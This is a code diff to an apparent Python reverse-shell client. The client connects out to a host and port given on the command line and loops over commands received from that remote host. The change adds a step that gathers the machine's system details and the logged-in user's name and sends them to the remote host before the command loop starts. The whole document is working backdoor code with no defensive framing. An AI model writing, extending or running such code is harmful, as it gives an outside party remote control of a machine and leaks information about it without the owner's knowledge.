@@ -37,12 +37,25 @@ def main():
 				exit("[!] Port parameter requires number.\n%s was supplied." % (port))
 		else:
 			assert False,"Unhandled Option"
-	shell(host,port)
+	connect(host,port)
 
-def shell(host,port):
+def connect(host,port):
+
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 	s.connect((host,port))
+
+	# sends system information back to the remote host.
+	x_info = ""
+	for x in os.uname():
+		x_info += x + ","
+	x_info += os.getlogin()
+	x_info = x_info.encode('utf-8')
+	s.send(x_info)
+	shell(s)
+	s.close()
+
+def shell(s):
 
 	while 1:
 		command = s.recv(1024)
@@ -58,6 +71,5 @@ def shell(host,port):
 		else:
 			break
 	s.close()
-
 if __name__ == "__main__":
 	main()
